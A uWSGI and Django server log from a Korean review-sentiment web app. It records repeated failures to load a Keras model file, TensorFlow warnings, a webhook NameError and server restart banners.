  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:20:28 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 223.194.169.151) !!!
Mon Aug 24 08:20:28 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during GET / (223.194.169.151)
OSError: write error
[pid: 11194|app: 0|req: 5/5] 223.194.169.151 () {50 vars in 873 bytes} [Mon Aug 24 08:20:05 2020] GET / => generated 32611 bytes in 22768 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:20:50.033782: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:20:50.035190: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:20:50.036576: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:20:53 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 223.194.169.151) !!!
Mon Aug 24 08:20:53 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during GET / (223.194.169.151)
OSError: write error
[pid: 11194|app: 0|req: 6/6] 223.194.169.151 () {50 vars in 873 bytes} [Mon Aug 24 08:20:28 2020] GET / => generated 32611 bytes in 24392 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:21:14.247086: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:21:14.248543: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:21:14.249910: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 11194|app: 0|req: 7/7] 223.194.169.151 () {48 vars in 848 bytes} [Mon Aug 24 08:20:53 2020] GET / => generated 158259 bytes in 24237 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:22:05.502210: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:22:05.503679: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:22:05.505062: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 11194|app: 0|req: 8/8] 223.194.169.151 () {52 vars in 904 bytes} [Mon Aug 24 08:21:46 2020] GET / => generated 158527 bytes in 22621 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:23:03.581348: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:23:03.582771: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:23:03.584189: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 11194|app: 0|req: 9/9] 223.194.169.151 () {48 vars in 848 bytes} [Mon Aug 24 08:22:44 2020] GET / => generated 158259 bytes in 22438 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:23:32 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55e09e8c4d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55e09e8c4d00 pid: 11277 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11277, cores: 1)
2020-08-24 08:23:37.942280: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-24 08:23:37.942318: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:24:00.919661: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-24 08:24:00.919692: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-24 08:24:00.919731: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-24 08:24:00.919956: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-24 08:24:00.944104: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199825000 Hz
2020-08-24 08:24:00.944492: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55e0a2192c70 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-24 08:24:00.944511: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-24 08:24:01.245162: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:24:01.246603: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:24:01.248011: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #정확도가 가장 높았을 때 저장된 모델을 로드
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 11277|app: 0|req: 1/1] 223.194.169.151 () {52 vars in 904 bytes} [Mon Aug 24 08:23:37 2020] GET / => generated 158527 bytes in 27059 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Gracefully killing worker 1 (pid: 11277)...
corrupted double-linked list
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 04:37:41 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5626ffe73cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5626ffe73cf0 pid: 3793 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 3793, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 40, in webhook
    return welcome()
  File "./haniumapp/views.py", line 47, in welcome
    text,score = naverNlp.predict_pos_text('3D만 아니었어도 별 다섯 개 줬을텐데.. 왜 3D로 나와서 제 심기를 불편하게 하죠??')
NameError: name 'naverNlp' is not defined
[pid: 3793|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Thu Aug 27 04:37:46 2020] POST /webhook/ => generated 66462 bytes in 62 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 04:40:03 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5631a47f0cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5631a47f0cf0 pid: 3805 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 3805, cores: 1)
2020-08-27 04:40:12.310615: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-27 04:40:12.310650: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-27 04:40:43.612907: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-27 04:40:43.612937: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-27 04:40:43.612954: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-27 04:40:43.613174: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-27 04:40:43.661432: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199915000 Hz
2020-08-27 04:40:43.661933: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5631a80bf9d0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-27 04:40:43.661951: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-27 04:40:44.084075: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-27 04:40:44.085559: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-27 04:40:44.086932: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
